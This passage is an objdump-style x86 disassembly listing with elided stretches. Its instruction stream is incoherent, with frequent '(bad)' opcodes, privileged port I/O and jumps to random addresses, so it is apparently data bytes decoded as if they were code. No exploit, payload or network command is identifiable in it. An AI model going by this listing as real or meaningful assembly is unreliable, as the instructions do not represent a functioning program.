  429db1:	jo     0x429dc2
  429db3:	push   0x1cf5841e
  429db8:	outs   dx,DWORD PTR ds:[esi]
  429db9:	mov    edx,0xcc14b971
  429dbe:	xrelease xchg BYTE PTR [edi+0x2a],al
  429dc2:	dec    ebx
  429dc3:	push   ecx
  429dc4:	mov    dh,0x6
  429dc6:	repnz fs into 
  429dc9:	pop    ss
  429dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429dcb:	int3   
  429dcc:	push   ss
  429dcd:	mov    eax,0x5e09c856
  429dd2:	pop    eax
  429dd3:	out    dx,al
  429dd4:	xor    esi,DWORD PTR [ebp+0x74]
  429dd7:	outs   dx,BYTE PTR ds:[esi]
  429dd8:	cmp    dh,BYTE PTR [ecx+eax*1-0x78ace862]
  429ddf:	cmc    
  429de0:	xchg   ebp,eax
  429de1:	popa   
  429de2:	dec    eax
  429de3:	mov    al,ds:0x7729a68a
  429de8:	pop    ds
  429de9:	inc    edx
  429dea:	jge    0x429e46
  429dec:	sbb    eax,0xa6
	...
  429e55:	add    BYTE PTR [ebx-0x13f33b49],bl
  429e5b:	jg     0x429e38
  429e5d:	mov    bh,0xe1
  429e5f:	sahf   
  429e60:	loop   0x429eca
  429e62:	mov    edx,0x678864a4
  429e67:	rol    DWORD PTR [ecx],0x0
  429e6a:	add    BYTE PTR [ecx],al
  429e6c:	add    BYTE PTR [eax],al
  429e6e:	adc    eax,0xbacad8f9
  429e73:	or     DWORD PTR [ebx],0x5f
  429e76:	dec    ecx
  429e77:	not    DWORD PTR [ebp-0x5cefc85]
  429e7d:	mov    BYTE PTR [edi-0x363ce43],bh
  429e83:	enter  0x2d3f,0xa4
  429e87:	arpl   WORD PTR [ebp+esi*4-0x3d9d05f],bx
  429e8e:	or     al,0x9b
  429e90:	mov    bh,0x4b
  429e92:	lds    edi,FWORD PTR [eax*2-0x41d11a9b]
  429e99:	pop    es
  429e9a:	lods   eax,DWORD PTR ds:[esi]
  429e9b:	or     ebp,0xffffffaf
  429e9e:	repnz pop es
  429ea0:	xchg   edx,eax
  429ea1:	push   esi
  429ea2:	push   ecx
  429ea3:	iret   
  429ea4:	(bad)  
  429ea5:	sbb    BYTE PTR [edi+0x39],bl
  429ea8:	int3   
  429ea9:	enter  0x9c14,0x25
  429ead:	sub    edi,0xe212d0b1
  429eb3:	mov    al,ds:0xcbd77223
  429eb8:	out    dx,al
  429eb9:	mov    ecx,0x1e7d6eed
  429ebe:	mov    esi,0x606418fc
  429ec3:	cwde   
  429ec4:	mov    ecx,0x6276a78
  429ec9:	shl    BYTE PTR [ebp-0x2c],cl
  429ecc:	fld    TBYTE PTR [ecx+0xbe3e1c7]
  429ed2:	cmp    DWORD PTR [ecx-0x4c],ebp
  429ed5:	shl    DWORD PTR [esp+edx*1-0x3d],1
  429ed9:	mov    ebp,0xc854f73c
  429ede:	sbb    dl,BYTE PTR [ebp+0x18]
  429ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ee2:	jae    0x429f0d
  429ee4:	or     BYTE PTR [ebx],al
  429ee6:	fwait
  429ee7:	push   edx
  429ee8:	hlt    
  429ee9:	jmp    0x9ae74edd
  429eee:	stc    
  429eef:	dec    ebp
  429ef0:	aad    0x17
  429ef2:	(bad)  
  429ef3:	fcmovnbe st,st(3)
  429ef5:	pop    eax
  429ef6:	sbb    al,0xdc
  429ef8:	cmp    cl,bl
  429efa:	mov    BYTE PTR [ebp+edi*1-0x367b0a56],0x26
  429f02:	push   cs
  429f03:	repz cdq 
  429f05:	gs pop esi
  429f07:	imul   ecx,DWORD PTR [esp+esi*4-0x26da3bdc],0xcc80a86f
  429f12:	cvttps2pi mm3,QWORD PTR [esi-0xc]
  429f16:	rcl    DWORD PTR [eax],cl
  429f18:	push   ss
  429f19:	xor    eax,0x8d4af171
  429f1e:	mov    eax,ds:0xf8d967a
  429f23:	out    dx,al
  429f24:	or     cl,BYTE PTR [ebp-0x55c1fe3d]
  429f2a:	and    eax,0xbe17b386
  429f2f:	mov    edi,0xef13a644
  429f34:	mov    cl,0x6
  429f36:	lock cs push es
  429f39:	dec    ebp
  429f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429f3b:	inc    ebp
  429f3c:	int    0xbf
  429f3e:	sar    ch,cl
  429f40:	jnp    0x429f68
  429f42:	sbb    al,0x79
  429f44:	dec    ebp
  429f45:	xchg   esp,eax
  429f46:	pop    ds
  429f47:	jbe    0x429fb9
  429f49:	and    bh,al
  429f4b:	inc    ebx
  429f4c:	xchg   edi,eax
  429f4d:	das    
  429f4e:	add    DWORD PTR [ebx+0x6f],edx
  429f51:	lock jbe 0x429f76
  429f54:	and    esp,DWORD PTR [eax+0x2b]
  429f57:	mov    es,ebx
  429f59:	mov    eax,0xd27afd30
  429f5e:	dec    ebp
  429f5f:	call   0xc1f34fcc
  429f64:	xchg   ebx,eax
  429f65:	imul   ecx,DWORD PTR [edx*4+0x51da7d34],0x18c8
	...
  429fd4:	add    BYTE PTR [eax],al
  429fd6:	xor    DWORD PTR [ebp-0x38],eax
  429fd9:	push   es
  429fda:	cld    
  429fdb:	(bad)  
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx-0x653cd975]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	sbb    eax,DWORD PTR [ecx]
  429ff0:	nop
  429ff1:	cmp    al,0x81
  429ff3:	das    
  429ff4:	mov    ch,bl
  429ff6:	retf   0x569b
  429ff9:	xor    BYTE PTR [esi],ch
  429ffb:	dec    edx
  429ffc:	mov    dl,0x0
  429ffe:	pop    esp
  429fff:	test   DWORD PTR [ecx],0x81e6c87b
  42a005:	inc    edx
  42a006:	adc    DWORD PTR [edi],esp
  42a008:	push   edx
  42a009:	sbb    ecx,DWORD PTR [eax-0x58]
  42a00c:	and    DWORD PTR [ebp-0x70a9b820],ebp
  42a012:	test   al,0x92
  42a014:	mov    eax,ds:0x7f7a3432
  42a019:	rcl    BYTE PTR [ecx+0x5324b8a5],cl
  42a01f:	xchg   DWORD PTR [esi],ebp
  42a021:	cwde   
  42a022:	test   al,0xdf
  42a024:	das    
  42a025:	iret   
  42a026:	pop    es
  42a027:	icebp  
  42a028:	mov    esi,0x98c7df7f
  42a02d:	xor    bh,BYTE PTR [eax]
  42a02f:	cli    
  42a030:	add    DWORD PTR [esi],ebp
  42a032:	pop    ebp
  42a033:	jbe    0x42a057
  42a035:	mov    bh,0x5e
  42a037:	neg    ch
  42a039:	jmp    0x42a028
  42a03b:	or     ah,BYTE PTR [esi]
  42a03d:	ds jbe 0x42a08d
  42a040:	pop    ds
  42a041:	cmp    eax,0x58bf4e65
  42a046:	ins    BYTE PTR es:[edi],dx
  42a047:	cmp    dh,dh
  42a049:	outs   dx,DWORD PTR ds:[esi]
  42a04a:	in     eax,dx
  42a04b:	rcl    BYTE PTR ds:0x1feba235,cl
  42a051:	sbb    DWORD PTR [ecx+0x7cf73917],ecx
  42a057:	pop    ebx
  42a058:	push   cs
  42a059:	fidivr DWORD PTR ds:0x33e2fb33
  42a05f:	xor    eax,0x86c2ee6d
  42a064:	adc    BYTE PTR [ebp+esi*1+0x2b7b512e],0x5b
  42a06c:	psrlw  mm1,QWORD PTR [esi-0x6f87e632]
  42a073:	in     al,dx
  42a074:	adc    al,0x1e
  42a076:	sbb    edx,edx
  42a078:	retf   
  42a079:	test   al,0x42
  42a07b:	inc    ecx
  42a07c:	in     eax,0x80
  42a07e:	ss sbb al,0xbc
  42a081:	dec    ebx
  42a082:	fild   QWORD PTR [esi-0x33]
  42a085:	jbe    0x42a05c
  42a087:	sub    esi,DWORD PTR [edx]
  42a089:	pop    ss
  42a08a:	es dec ebx
  42a08c:	inc    ebp
  42a08d:	icebp  
  42a08e:	je     0x42a072
  42a090:	xor    DWORD PTR [ebp+0x322b6472],ebp
  42a096:	jge    0x42a086
  42a098:	lahf   
  42a099:	cwde   
  42a09a:	jno    0x42a114
  42a09c:	jp     0x42a028
  42a09e:	pushf  
  42a09f:	push   0x7a
  42a0a1:	mov    bl,0xb5
  42a0a3:	repz pop esi
  42a0a5:	std    
  42a0a6:	mov    esp,0x18d0fc43
  42a0ab:	push   esi
  42a0ac:	imul   eax,edx,0xf1c085a3
  42a0b2:	std    
  42a0b3:	lods   al,BYTE PTR ds:[esi]
  42a0b4:	popf   
  42a0b5:	mov    ah,BYTE PTR [esi+0x23136b7a]
  42a0bb:	loope  0x42a0c9
  42a0bd:	call   0xf64ea7a0
  42a0c2:	jg     0x42a07d
  42a0c4:	sbb    eax,0x8852cdb8
  42a0c9:	sbb    DWORD PTR [edx-0xadc21d4],eax
  42a0cf:	jnp    0x42a0a1
  42a0d1:	push   edi
  42a0d2:	pop    es
  42a0d3:	inc    ecx
  42a0d4:	mov    eax,ds:0x711b1b10
  42a0d9:	cmp    edi,DWORD PTR [edi]
  42a0db:	dec    ebx
  42a0dc:	cwde   
  42a0dd:	js     0x42a0be
  42a0df:	push   edx
  42a0e0:	mov    al,0x71
  42a0e2:	outs   dx,DWORD PTR ds:[esi]
  42a0e3:	cmp    al,0x55
  42a0e5:	sub    al,0x10
  42a0e7:	daa    
  42a0e8:	xor    DWORD PTR [ebx+0x26e68f9e],edi
	...
  42a156:	xlat   BYTE PTR ds:[ebx]
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	test   eax,0x67c2aa6e
  42a167:	ret    
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	arpl   WORD PTR [ecx],dx
  42a170:	inc    ecx
  42a171:	xor    ebp,ecx
  42a173:	fadd   QWORD PTR [edi]
  42a175:	es (bad) 
  42a177:	lock and eax,0x579486c6
  42a17d:	pushf  
  42a17e:	aas    
  42a17f:	pop    edi
  42a180:	cwde   
  42a181:	mov    edi,0xdbff1ef1
  42a186:	jle    0x42a17e
  42a188:	push   esp
  42a189:	mov    bl,0x26
  42a18b:	out    0xdc,al
  42a18d:	fld    TBYTE PTR [edx]
  42a18f:	adc    eax,0x4efa92fd
  42a194:	sub    BYTE PTR [edx+0x4e],0x33
  42a198:	jnp    0x42a16b
  42a19a:	push   edx
  42a19b:	jmp    0x42a14f
  42a19d:	sbb    al,0xc5
  42a19f:	ins    BYTE PTR es:[edi],dx
  42a1a0:	xor    DWORD PTR [edi],esp
  42a1a2:	nop
  42a1a3:	cmp    al,0xf9
  42a1a5:	sahf   
  42a1a6:	arpl   WORD PTR [ecx+0x4a],dx
  42a1a9:	cld    
  42a1aa:	mov    eax,0x760a490b
  42a1af:	inc    edi
  42a1b0:	out    0xbc,al
  42a1b2:	dec    edx
  42a1b3:	enter  0x6f89,0x3b
  42a1b7:	xchg   ebp,eax
  42a1b8:	in     al,0x49
  42a1ba:	rcl    al,1
  42a1bc:	jecxz  0x42a207
  42a1be:	inc    ebx
  42a1bf:	in     al,dx
  42a1c0:	and    BYTE PTR [ebx+0x18d8e226],dh
  42a1c6:	retf   0x5575
  42a1c9:	mov    dl,0x9c
  42a1cb:	jo     0x42a173
  42a1cd:	push   ds
  42a1ce:	mov    ebp,0xddaab407
  42a1d3:	aas    
  42a1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a1d5:	popf   
  42a1d6:	fstp   DWORD PTR ds:0xf63ce6e8
  42a1dc:	call   0xa427:0x6ed33077
  42a1e3:	aas    
  42a1e4:	inc    esi
  42a1e5:	(bad)  
  42a1e6:	mov    eax,ds:0x30cdd1d7
  42a1eb:	and    ch,dl
  42a1ed:	dec    ebp
  42a1ee:	out    dx,al
  42a1ef:	stc    
  42a1f0:	jb     0x42a24e
  42a1f2:	stos   DWORD PTR es:[edi],eax
  42a1f3:	neg    bl
  42a1f5:	push   0x22fa193f
  42a1fa:	mov    eax,0xb2c86e1e
  42a1ff:	mov    esi,0x4d6a7c8
  42a204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a205:	jp     0x42a260
  42a207:	jg     0x42a27a
  42a209:	fmul   DWORD PTR [ebx+0x33]
  42a20c:	inc    ecx
  42a20d:	les    edi,FWORD PTR [eax]
  42a20f:	mov    bl,al
  42a211:	lods   al,BYTE PTR ds:[esi]
  42a212:	das    
  42a213:	(bad)  
  42a214:	xor    al,0xd1
  42a216:	(bad)  
  42a217:	ins    DWORD PTR es:[edi],dx
  42a218:	adc    DWORD PTR [ebp+0x46],ebp
  42a21b:	seto   dh
  42a21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a21f:	jb     0x42a20a
  42a221:	daa    
  42a222:	push   ebp
  42a223:	push   0xffffff8f
  42a225:	sbb    al,0xd0
  42a227:	xchg   esp,eax
  42a228:	jbe    0x42a275
  42a22a:	loopne 0x42a295
  42a22c:	test   DWORD PTR [ebx+ecx*2-0x326d6200],eax
  42a233:	dec    ebx
  42a234:	mov    bh,0x6f
  42a236:	jmp    0x42a27f
  42a238:	sub    DWORD PTR [edx-0x296a305d],esp
  42a23e:	xchg   ecx,eax
  42a23f:	push   ds
  42a240:	xchg   ecx,eax
  42a241:	cmp    al,0x3f
  42a244:	push   eax
  42a245:	out    0x47,al
  42a247:	xor    BYTE PTR ds:0x615f9b70,cl
  42a24d:	cmp    BYTE PTR [esi+0x59],dl
  42a250:	and    ebx,DWORD PTR [esp+edx*1+0x3b]
  42a254:	jns    0x42a212
  42a256:	sub    eax,0x3f7d6b76
  42a25b:	cmp    BYTE PTR [edi-0x568f1338],ch
  42a261:	aas    
  42a262:	mov    al,0x5
  42a264:	sbb    DWORD PTR [esp+ebx*8],0xd0ba6a9e
  42a26b:	test   eax,0x4417
	...
  42a2d4:	add    BYTE PTR [eax],al
  42a2d6:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a2dc:	scas   eax,DWORD PTR es:[edi]
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fld    st(7)
  42a2e3:	clc    
  42a2e4:	in     eax,dx
  42a2e5:	and    BYTE PTR [edi-0x3c],ah
  42a2e8:	add    DWORD PTR [eax],eax
  42a2ea:	add    BYTE PTR [ecx],al
  42a2ec:	add    BYTE PTR [eax],al
  42a2ee:	jl     0x42a36d
  42a2f0:	dec    ebp
  42a2f1:	pop    ebp
  42a2f2:	pushf  
  42a2f3:	fistp  WORD PTR [ebp-0x44d45ff5]
  42a2f9:	adc    BYTE PTR [edx],ch
  42a2fb:	orps   xmm5,XMMWORD PTR [ebp-0x1614d682]
  42a302:	jmp    0xbd03f2f5
  42a307:	pop    ds
  42a308:	cmp    eax,0x3dc7bf80
  42a30d:	arpl   WORD PTR [ebp+0x52ae26f7],cx
  42a313:	xchg   ebx,eax
  42a314:	cmc    
  42a315:	outs   dx,BYTE PTR ds:[esi]
  42a316:	xchg   edi,eax
  42a317:	xor    ebx,DWORD PTR ds:0x74ab7469
  42a31d:	mov    ebx,DWORD PTR [esi-0x2deb620c]
  42a323:	fsub   st,st(2)
  42a325:	loopne 0x42a32b
  42a327:	mov    edi,DWORD PTR [ecx-0x5c3ef9d3]
  42a32d:	cmc    
  42a32e:	rcl    ch,0x7f
  42a331:	and    ebp,DWORD PTR [eax+0x71]
  42a334:	(bad)  
  42a335:	clc    
  42a336:	push   es
  42a337:	adc    cl,BYTE PTR [ebx]
  42a339:	aaa    
  42a33a:	int3   
  42a33b:	or     al,0x17
  42a33d:	aas    
  42a33e:	ins    BYTE PTR es:[edi],dx
  42a33f:	ja     0x42a344
  42a341:	stos   BYTE PTR es:[edi],al
  42a342:	icebp  
  42a343:	dec    edi
  42a344:	adc    dh,al
  42a346:	jnp    0x42a32c
  42a348:	xchg   ecx,eax
  42a349:	addr16 mov al,0xe3
  42a34c:	fisubr DWORD PTR [edx+0x0]
  42a34f:	push   ecx
  42a350:	sahf   
  42a351:	cmp    al,0x80
  42a353:	sbb    al,0x87
  42a355:	adc    DWORD PTR ds:0xed4a6555,eax
  42a35b:	mov    esp,0x420a88ff
  42a360:	leave  
  42a361:	sub    al,0x48
  42a363:	dec    eax
  42a364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a365:	jae    0x42a3a4
  42a367:	and    edx,edi
  42a369:	push   edi
  42a36a:	call   0x2751ee00
  42a36f:	gs jnp 0x42a3d5
  42a372:	adc    ecx,DWORD PTR [ebx+ebx*2]
  42a375:	jns    0x42a310
  42a377:	xor    al,0x49
  42a379:	pop    ebp
  42a37a:	sbb    dh,ch
  42a37c:	push   eax
  42a37d:	and    eax,0x7645316c
  42a382:	int    0xf2
  42a384:	add    DWORD PTR [ecx+ebp*8-0x2aaa24e0],0xffffff94
  42a38c:	loop   0x42a311
  42a38e:	(bad)  
  42a38f:	dec    ecx
  42a390:	lahf   
  42a391:	jmp    0xf44fb1f7
  42a396:	shl    DWORD PTR [eax+edi*1+0x3fd96918],0x96
  42a39e:	jns    0x42a3f1
  42a3a0:	div    esp
  42a3a2:	in     al,dx
  42a3a3:	adc    eax,0xb8af971f
  42a3a8:	push   edx
  42a3a9:	xor    BYTE PTR [edi+0x79b8828b],dh
  42a3af:	inc    esi
  42a3b0:	cwde   
  42a3b1:	ds and edx,eax
  42a3b4:	fs ror eax,cl
  42a3b7:	xor    edx,ecx
  42a3b9:	xchg   esp,eax
  42a3ba:	lds    eax,FWORD PTR [ebx+0x0]
  42a3bd:	aam    0xb1
  42a3bf:	das    
  42a3c0:	test   BYTE PTR [ecx],bh
  42a3c2:	jbe    0x42a386
  42a3c4:	jg     0x42a444
  42a3c6:	(bad)  
  42a3c7:	push   ecx
  42a3c8:	dec    ecx
  42a3c9:	and    ebp,DWORD PTR [eax]
  42a3cb:	add    ch,bl
  42a3cd:	(bad)  
  42a3cf:	mov    esi,0x114f3b8d
  42a3d4:	cmp    ah,bh
  42a3d6:	mov    DWORD PTR [ecx-0x7c],eax
  42a3d9:	sahf   
  42a3da:	(bad)  
  42a3db:	push   ecx
  42a3dc:	iret   
  42a3dd:	or     ecx,DWORD PTR [esi-0x5e]
  42a3e0:	mov    ebx,0x5580f91c
  42a3e5:	clc    
  42a3e6:	ins    DWORD PTR es:[edi],dx
  42a3e7:	outs   dx,BYTE PTR ds:[esi]
  42a3e8:	jno    0x42a390
  42a3ea:	dec    ebx
  42a3eb:	gs pop es
  42a3ed:	sbb    eax,DWORD PTR [eax]
	...
  42a453:	add    BYTE PTR [eax],al
  42a455:	add    BYTE PTR [edi+0xe],bh
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x8f83333d
  42a465:	mov    eax,0x1c567
  42a46a:	add    BYTE PTR [ecx],al
  42a46c:	add    BYTE PTR [eax],al
  42a46e:	or     DWORD PTR [edx+0x33],0x4adf76ee
  42a475:	lahf   
  42a476:	xor    al,0xec
  42a478:	mul    BYTE PTR [edx+0x25c120b7]
  42a47e:	bound  ebp,QWORD PTR [ecx+edx*2]
  42a481:	jmp    0x42a46a
  42a483:	out    dx,eax
  42a484:	in     eax,dx
  42a485:	ins    BYTE PTR es:[edi],dx
  42a486:	mov    ds:0xf3c4ec4d,al
  42a48b:	es fwait
  42a48d:	ins    BYTE PTR es:[edi],dx
  42a48e:	lock les ecx,FWORD PTR [ebx-0x39]
  42a492:	sub    DWORD PTR [ecx-0x3cbaa42e],ebp
  42a498:	inc    ecx
  42a499:	xchg   edi,eax
  42a49a:	xchg   edi,eax
  42a49b:	dec    ecx
  42a49c:	or     esi,DWORD PTR [ebp+0x4f]
  42a49f:	aaa    
  42a4a0:	pop    esi
  42a4a1:	sub    esi,ebp
  42a4a3:	push   esp
  42a4a4:	int3   
  42a4a5:	push   edx
  42a4a6:	add    al,0xb5
  42a4a8:	aas    
  42a4a9:	int    0x99
  42a4ab:	mov    ch,0xac
  42a4ad:	test   BYTE PTR [ebp+0x45e89318],bh
  42a4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4b4:	das    
  42a4b5:	xor    BYTE PTR [edx],ch
  42a4b7:	and    bh,BYTE PTR [ebx+0x318f4c93]
  42a4bd:	mov    esp,0xf5bb91d1
  42a4c2:	popf   
  42a4c3:	test   al,0x86
  42a4c5:	sbb    BYTE PTR [ebp+ecx*4-0x50],ah
  42a4c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4ca:	dec    edx
  42a4cb:	inc    ecx
  42a4cc:	jmp    0xe5bb:0xc1cef93f
  42a4d3:	mov    eax,0x3f1569eb
  42a4d8:	popa   
  42a4d9:	call   esp
  42a4db:	aam    0x61
  42a4dd:	jae    0x42a4a1
  42a4df:	and    dh,cl
  42a4e1:	jmp    0xee7b63d
  42a4e6:	push   edx
  42a4e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4e8:	sub    dh,dl
  42a4ea:	push   0xffffffb6
  42a4ec:	jne    0x42a4bd
  42a4ee:	pop    ss
  42a4ef:	lods   al,BYTE PTR ds:[esi]
  42a4f0:	test   eax,0xc483f172
  42a4f5:	and    ch,0x7a
  42a4f8:	sbb    esp,esi
  42a4fa:	add    edi,DWORD PTR [edx]
  42a4fc:	pushf  
  42a4fd:	jg     0x42a512
  42a4ff:	imul   ebx,edi,0x9c1aece0
  42a505:	out    dx,al
  42a506:	inc    eax
  42a507:	pop    edi
  42a508:	pushf  
  42a509:	mov    ecx,0x543babd9
  42a50e:	cmc    
  42a50f:	int3   
  42a510:	dec    esp
  42a511:	adc    al,0xa5
  42a513:	and    al,0xa5
  42a515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a516:	or     eax,DWORD PTR [ebx+0x5f4a5c90]
  42a51c:	sbb    esi,edx
  42a51e:	pop    esi
  42a51f:	mov    ecx,edi
  42a521:	push   edx
  42a522:	mov    cl,BYTE PTR [edx+0x5b]
  42a525:	retf   0xfc08
  42a528:	sub    eax,0xf8e822d9
  42a52d:	sbb    bl,BYTE PTR [edi-0x2d6aa277]
  42a533:	pop    ecx
  42a534:	stos   BYTE PTR es:[edi],al
  42a535:	xor    eax,0xba4cfbe6
  42a53a:	pop    ebx
  42a53b:	outs   dx,DWORD PTR ds:[esi]
  42a53c:	retf   0x1455
  42a53f:	fs (bad) 
  42a541:	mul    DWORD PTR [edx+0xc]
  42a544:	aas    
  42a545:	aas    
  42a546:	jo     0x42a581
  42a548:	xchg   esp,eax
  42a549:	imul   dh
  42a54b:	clc    
  42a54c:	sbb    edi,ecx
  42a54e:	outs   dx,BYTE PTR ds:[esi]
  42a54f:	jl     0x42a501
  42a551:	inc    esp
  42a552:	lea    esi,[edi]
  42a554:	xor    esp,DWORD PTR [eax+0x41deb4c3]
  42a55a:	popf   
  42a55b:	pop    ds
  42a55c:	inc    esi
  42a55d:	mov    bh,0x96
  42a55f:	adc    bl,ch
  42a561:	int    0x67
  42a563:	xor    ebp,DWORD PTR [ecx-0x2cd026d]
  42a569:	mov    esi,ds
  42a56b:	jle    0x42a510
  42a56d:	ja     0x42a56f
	...
  42a5d3:	add    BYTE PTR [eax],al
  42a5d5:	add    BYTE PTR [eax],bl
  42a5d7:	dec    edi
  42a5d8:	pop    ss
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x369b459f
  42a5e5:	shl    BYTE PTR [edi-0x3a],1
  42a5e8:	add    DWORD PTR [eax],eax
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	mov    ds:0x7a26b33f,eax
  42a5f3:	jge    0x42a578
  42a5f5:	pop    esp
  42a5f6:	retf   
  42a5f7:	push   es
  42a5f8:	pop    ecx
  42a5f9:	and    edi,DWORD PTR es:[edx+0x42]
  42a5fd:	bound  ecx,QWORD PTR [ecx]
  42a5ff:	int    0xf3
  42a601:	xchg   ebp,eax
  42a602:	fsubr  DWORD PTR [eax+0x34]
  42a605:	xchg   ebx,eax
  42a606:	push   ss
  42a607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a608:	adc    al,0x7d
  42a60a:	sub    eax,0x286c67c1
  42a60f:	iret   
  42a610:	arpl   WORD PTR [edi],si
  42a612:	or     al,0x70
  42a614:	ror    BYTE PTR [ebx-0x3a],0xe2
  42a618:	out    0xa8,al
  42a61a:	xchg   ebx,eax
  42a61b:	pop    ebp
  42a61c:	rol    dh,0x90
  42a61f:	outs   dx,DWORD PTR ds:[esi]
  42a620:	mov    ds:0x8cf6ed6d,eax
  42a625:	mov    ds:0xd83084ab,al
  42a62a:	stos   DWORD PTR es:[edi],eax
  42a62b:	adc    ecx,DWORD PTR [edx+ebx*8-0x7806a53b]
  42a632:	sbb    ch,dl
  42a634:	or     al,0x21
  42a636:	lods   al,BYTE PTR ds:[esi]
  42a637:	jmp    DWORD PTR [edi+0x3af7cbb5]
  42a63d:	test   eax,0x1b7266aa
  42a642:	pop    esp
  42a643:	mov    ecx,0x62711212
  42a648:	lea    esi,[ebp-0x5f560a08]
  42a64e:	adc    al,0xab
  42a651:	fwait
  42a652:	adc    DWORD PTR [eax],ebx
  42a654:	inc    esp
  42a655:	in     eax,dx
  42a656:	stc    
  42a657:	lods   eax,DWORD PTR ds:[esi]
  42a658:	xchg   esi,eax
  42a659:	mov    eax,0x2d3e5a9a
  42a65e:	inc    edi
  42a65f:	push   ss
  42a660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a661:	inc    ebx
  42a662:	push   ebx
  42a663:	call   0x255db4b1
  42a668:	les    edi,FWORD PTR [ebx+0x5a]
  42a66b:	pop    ecx
  42a66c:	pop    sp
  42a66e:	push   edx
  42a66f:	loop   0x42a656
  42a671:	xor    esi,eax
  42a673:	in     eax,0xae
  42a675:	call   0x494734fe
  42a67a:	mov    bh,0x7e
  42a67c:	push   ds
  42a67d:	mov    edi,0x9b092a86
  42a682:	mov    al,0x72
  42a684:	sub    BYTE PTR [esi+eax*1-0x6cdea69e],al
  42a68b:	clc    
  42a68c:	(bad)  
  42a68d:	cdq    
  42a68e:	inc    ebx
  42a68f:	aaa    
  42a690:	sub    dl,BYTE PTR [esi]
  42a692:	retf   0x64ef
  42a695:	int3   
  42a696:	sti    
  42a697:	push   cs
  42a698:	test   eax,0xff663a78
  42a69d:	push   esp
  42a69e:	les    edi,FWORD PTR [esi]
  42a6a0:	retf   0xb835
  42a6a3:	ror    DWORD PTR [ecx+0x52939dd6],cl
  42a6a9:	scas   eax,DWORD PTR es:[edi]
  42a6aa:	imul   BYTE PTR [eax+0x243b9cad]
  42a6b0:	add    ah,BYTE PTR ds:0xc9fe6124
  42a6b6:	pop    ebp
  42a6b7:	and    BYTE PTR [ebp-0x570251af],bh
  42a6bd:	inc    edx
  42a6be:	lods   al,BYTE PTR ds:[esi]
  42a6bf:	pop    esi
  42a6c0:	jne    0x42a6a9
  42a6c2:	jno    0x42a66b
  42a6c4:	shl    bl,0x91
  42a6c7:	mov    edx,DWORD PTR [eax+0x16]
  42a6ca:	push   eax
  42a6cb:	(bad)  
  42a6cc:	jg     0x42a6ba
  42a6ce:	scas   eax,DWORD PTR es:[edi]
  42a6cf:	outs   dx,DWORD PTR ds:[esi]
  42a6d0:	mov    ebp,0x84c6ae26
  42a6d5:	jns    0x42a6f4
  42a6d7:	fs mov al,0x10
  42a6da:	and    bh,BYTE PTR [ecx-0x92f103d]
  42a6e0:	adc    edi,DWORD PTR [ebp+0x30]
  42a6e3:	(bad)  
  42a6e4:	fcmovnb st,st(4)
  42a6e6:	mov    dh,0xa0
  42a6e8:	mov    al,BYTE PTR [ebx-0x24]
  42a6eb:	dec    eax
  42a6ec:	adc    al,0x8f
	...
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x7c47ece4],0x67dfca9e
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    bl,ch
  42a76f:	in     eax,0x39
  42a771:	and    edx,DWORD PTR [edi-0xabfa523]
  42a777:	stos   BYTE PTR es:[edi],al
  42a778:	retf   
  42a779:	outs   dx,BYTE PTR ds:[esi]
  42a77a:	add    al,0x61
  42a77c:	int3   
  42a77d:	mov    ah,0x42
  42a77f:	ss mov dh,0x40
  42a782:	mov    WORD PTR ss:[ebp+0x6ef96d55],es
  42a789:	test   edi,edi
  42a78b:	mov    ah,0x4
  42a78d:	outs   dx,BYTE PTR ds:[esi]
  42a78e:	mov    dh,BYTE PTR [edx]
  42a790:	adc    edx,DWORD PTR [edx]
  42a792:	sbb    ebx,DWORD PTR [ebx-0x4a167339]
  42a798:	aas    
  42a799:	mov    bh,0xa7
  42a79b:	retf   0xf9b1
  42a79e:	outs   dx,BYTE PTR gs:[esi]
  42a7a0:	mov    ch,0x8c
  42a7a2:	mov    esp,0xd26fa060
  42a7a7:	push   0x56499e16
  42a7ac:	cmp    eax,0xc9d2266d
  42a7b1:	push   edx
  42a7b2:	imul   DWORD PTR [edx+0x6f]
  42a7b5:	ret    0x27f5
  42a7b8:	sbb    al,0xb5
  42a7ba:	scas   al,BYTE PTR es:[edi]
  42a7bb:	or     BYTE PTR [ebp+0x8298186],bl
  42a7c1:	icebp  
  42a7c2:	repz cmc 
  42a7c4:	addr16 pop esp
  42a7c6:	pop    edx
